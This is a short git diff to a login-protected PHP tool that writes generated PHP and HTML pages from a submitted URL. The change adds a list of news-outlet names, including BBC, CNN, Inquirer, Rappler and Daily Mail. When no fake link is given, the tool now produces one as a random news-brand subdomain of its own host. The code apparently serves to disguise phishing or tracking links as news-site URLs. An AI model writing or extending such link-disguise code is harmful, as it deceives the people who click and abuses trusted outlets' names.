@@ -96,6 +96,33 @@ if (!isset($_SESSION['UserData']['Username'])) {
     <br>
     </form>
     <?php
+$subName = [
+    'bbc',
+    'cnn',
+    'abc-cbn',
+    'gma',
+    'inquirer',
+    'philstar',
+    'rappler',
+    'cnnphilippines',
+    'breakingnews',
+    'msn',
+    'news',
+    'gmanetwork',
+    'philippinesnews',
+    'tnp',
+    'trendingnewsportal',
+    'extremereader',
+    'manila',
+    'yahoo',
+    'pep',
+    '9gag',
+    'diple',
+    'dailystar',
+    'dailynews',
+    'dailymail',
+    'filipo',
+];
 error_reporting(0);
 if ($_POST["url"]) {
     // $n=rand(0000,9999);
@@ -105,7 +132,7 @@ if ($_POST["url"]) {
 
     $fakeLink = $_POST['fake_link'];
     if (($_POST['fake_link']) == '') {
-        $fakeLink = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $fileHtml;
+        $fakeLink = 'http://' . $subName[array_rand($subName)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $fileHtml;
     }
     $fphp = fopen($filePhp, 'w');
     $fhtml = fopen($fileHtml, 'w');
